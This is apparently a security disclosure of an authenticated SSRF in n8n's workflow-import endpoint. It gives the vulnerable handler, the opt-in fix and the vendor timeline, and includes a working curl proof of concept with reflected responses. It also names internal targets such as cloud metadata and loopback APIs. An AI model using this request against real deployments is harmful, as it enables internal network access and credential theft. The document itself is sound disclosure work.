# n8n: SSRF via workflow import endpoint (`/rest/workflows/from-url`) — fixed as a non-security bugfix, with an incomplete (default-off) fix

| Field | Value |
|---|---|
| Date | 2026-06-26 |
| Product | n8n |
| Type | SSRF (CWE-918), authenticated |
| Affected versions | `<= 2.19.x` unconditionally (validated on 2.19.0); `2.20.0` – `2.28.2` (latest) by default, i.e. when `N8N_SSRF_PROTECTION_ENABLED` is not set to `true` |
| Fixed in | 2.20.0 (released 2026-05-05), via [PR #29178](https://github.com/n8n-io/n8n/pull/29178) / commit [`ecd0ba8eba`](https://github.com/n8n-io/n8n/commit/ecd0ba8eba) — but opt-in only (see below) |
| CVE | none assigned |
| Status | Independent parallel discovery; fixed as a non-security bugfix, no advisory; fix is incomplete by default |

### Status detail

- This was an **independent parallel discovery**. n8n found and began fixing the
  same issue internally before this report: [PR #29178](https://github.com/n8n-io/n8n/pull/29178)
  was opened 2026-04-27 (tracked under internal ticket CAT-2890) and merged
  2026-04-29. This report was filed independently on 2026-04-29.
- The fix shipped in 2.20.0 (2026-05-05). It was released as an ordinary
  `fix(core)` bugfix — **no CVE and no security advisory were issued**, so the
  change is not flagged to operators as a security fix.
- The vendor declined this report on 2026-05-20 as not qualifying.
- This disclosure documents (a) a confirmed SSRF that was fixed without a
  security advisory, and (b) that the fix is **incomplete by default**: on a
  stock install the endpoint remains exploitable.

## Summary

n8n exposed an authenticated server-side request forgery (SSRF) in the workflow
import endpoint `GET /rest/workflows/from-url`. The handler took a
user-controlled `url` query parameter and performed a direct
`axios.get(query.url)` with no hostname validation, no IP blocklist, and no
integration with n8n's own `SsrfProtectionService`.

Any authenticated, non-admin user holding project-scoped `workflow:create`
permission could use this endpoint to make the n8n server issue
outbound HTTP requests to arbitrary destinations — including loopback
(`127.0.0.1`), link-local (`169.254.0.0/16`), and RFC1918 internal ranges — and
have the response body reflected back to the caller when it matched the expected
workflow JSON shape.

## Relevant n8n behavior (pre-fix)

In `packages/cli/src/workflows/workflows.controller.ts`, the `getFromUrl`
handler:

- was reachable by any authenticated user with `workflow:create` in a project;
- read the user-controlled `query.url`;
- called `axios.get<IWorkflowResponse>(query.url)` directly;
- returned the fetched body to the caller if it parsed as workflow JSON, and a
  generic `400` otherwise — but only *after* the server-side request had fired.

## Proof of concept

Validated against a local self-hosted instance
(`docker run -p 5678:5678 n8nio/n8n:2.19.0`).

Prerequisite: any authenticated account with `workflow:create` in at least one
project.

```bash
# Trigger the server-side fetch to an attacker-chosen internal address
curl -v -G -b /tmp/n8n-cookies.txt \
  'http://localhost:5678/rest/workflows/from-url' \
  --data-urlencode "projectId=$PROJECT_ID" \
  --data-urlencode 'url=http://172.17.0.1:8888/'
```

Observed: the n8n server made the outbound request to the chosen internal
address (confirmed in the target's access log, `User-Agent: axios/1.15.0`).
When the internal service returned JSON with `nodes` and `connections` keys, the
full response body was reflected to the caller with `200 OK`:

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"data":{"nodes":[],"connections":{},"secret":"SSRF_CONFIRMED"}}
```

## Confirmed impact

- Arbitrary authenticated server-side fetch to attacker-chosen targets reachable
  from the n8n server, including loopback and RFC1918 addresses.
- Response reflection when the target returns workflow-shaped JSON; otherwise a
  boolean/timing oracle via response and error differences.

On managed cloud deployments, an outbound-fetch primitive of this class is the
standard precondition for reaching internal services and cloud metadata
endpoints. Cloud metadata exfiltration was not independently validated and is
not claimed here as confirmed.

## The fix — and why it is incomplete by default

The endpoint was remediated in:

- [PR #29178](https://github.com/n8n-io/n8n/pull/29178) — "fix(core): Validate workflow import URL requests"
- commit [`ecd0ba8eba`](https://github.com/n8n-io/n8n/commit/ecd0ba8eba)
- first released in n8n 2.20.0 on 2026-05-05

The handler no longer calls `axios.get(query.url)` directly. It now routes the
user-supplied URL through `SsrfProtectionService` via a new
`fetchWorkflowFromUrl()` method:

```ts
private async fetchWorkflowFromUrl(url: string) {
  const client = this.outboundHttp.requests({
    ssrf: this.ssrfConfig.enabled ? this.ssrfProtectionService : 'disabled',
  });
  try {
    return await client.request<IWorkflowResponse>({ method: 'GET', url });
  } catch (error) {
    const blockedError = this.findSsrfBlockedError(error);
    if (blockedError) throw blockedError;
    throw new BadRequestError('The URL does not point to valid JSON file!');
  }
}
```

**Protection is conditional on `this.ssrfConfig.enabled`, and that flag is off
by default.** From `packages/@n8n/config/src/configs/ssrf-protection.config.ts`:

```ts
@Env('N8N_SSRF_PROTECTION_ENABLED')
enabled: boolean = false; // "Off by default so existing self-hosted setups ... keep working"
```

Consequently, on a default install (where `N8N_SSRF_PROTECTION_ENABLED` is
unset), `fetchWorkflowFromUrl` passes `ssrf: 'disabled'` and performs an
**unprotected** outbound fetch. The proof-of-concept above — run on a stock
container with no flag set — continues to succeed on patched 2.20.0+ builds.

When the flag *is* enabled, the request is routed through the
`SsrfProtectionService` in `packages/@n8n/backend-network`, which validates the
resolved IP at pre-flight, at socket connect time (a custom DNS `lookup`, so a
rebinding TOCTOU is rechecked), and on every HTTP redirect hop, against a
blocklist covering loopback, link-local and RFC1918 ranges.

| Scenario | <= 2.19.x | 2.20.0+ |
|---|---|---|
| `N8N_SSRF_PROTECTION_ENABLED=true` | endpoint unprotected | protected |
| Default install (flag unset) | vulnerable | **still vulnerable** |

### Live confirmation on the latest release (n8n@2.28.2, 2026-06-26; listener timestamps are UTC)

Stock container, no flags (`docker run -d -p 5678:5678 -e N8N_SECURE_COOKIE=false
n8nio/n8n:2.28.2`), import pointed at an internal RFC1918 listener:

```
GET /rest/workflows/from-url ... url=http://172.17.0.1:8888/
--> HTTP 200
{"data":{"nodes":[],"connections":{},"secret":"SSRF_CONFIRMED_2282"}}

listener log: VICTIM-HIT path=/ UA=n8n from=172.17.0.2   (request from the n8n container)
```

About the target `http://172.17.0.1:8888/`: this is the attacker-supplied `url`.
`172.17.0.1` is the Docker bridge gateway — i.e. the host as seen *from inside*
the n8n container, an address the server can reach but an external attacker
cannot. It sits in `172.16.0.0/12` (RFC1918), the exact private range n8n's SSRF
blocklist covers, so the same URL exercises both states (reflected on a default
install, blocked when protection is on). `:8888` is a logging HTTP listener that
returns workflow-shaped JSON so n8n treats the fetch as a successful import and
reflects the body. The listener log line `from=172.17.0.2` is the n8n container's
own IP — proof the request was made server-side, not by the client. In a real
deployment an attacker would substitute a sensitive internal target reachable by
the n8n host, e.g. `http://169.254.169.254/latest/meta-data/` (cloud metadata),
`http://127.0.0.1:5678/rest/...` (n8n's own loopback APIs), or any
`http://10.x/192.168.x` internal service.

Same request with `N8N_SSRF_PROTECTION_ENABLED=true`:

```
--> HTTP 400
{"code":0,"message":"The request was blocked because it resolves to a restricted IP address"}
(no request reaches the listener)
```

The protection works; the shipped controller disables the SSRF bridge when the
flag is unset, leaving this request path unprotected by default.

## Vendor position

The vendor declined this report on 2026-05-20 as not qualifying, in part citing
a shared-responsibility framing for self-hosted SSRF. The fix itself was
independent internal work (PR #29178, opened before this report under CAT-2890),
released as an ordinary bugfix without a CVE or advisory.

This disclosure does not claim the fix was prompted by this report, and does not
seek credit for it. It documents that the behavior is a genuine SSRF, that it
was corrected without a public security advisory, and that the correction leaves
the default configuration exploitable.

## Timeline

- 2026-04-27: n8n opens PR #29178 internally (ticket CAT-2890).
- 2026-04-29: this SSRF independently reported to the n8n security team.
- 2026-04-29: PR #29178 merged.
- 2026-05-05: fix released in n8n 2.20.0 (no CVE / no advisory).
- 2026-05-20: vendor declines this report as "does not qualify."
- 2026-06-13, 2026-06-17: reporter follow-ups requesting status.
- 2026-06-26: public disclosure published (this document); independent
  rediscovery noted, with emphasis on the default-off incomplete-fix gap.
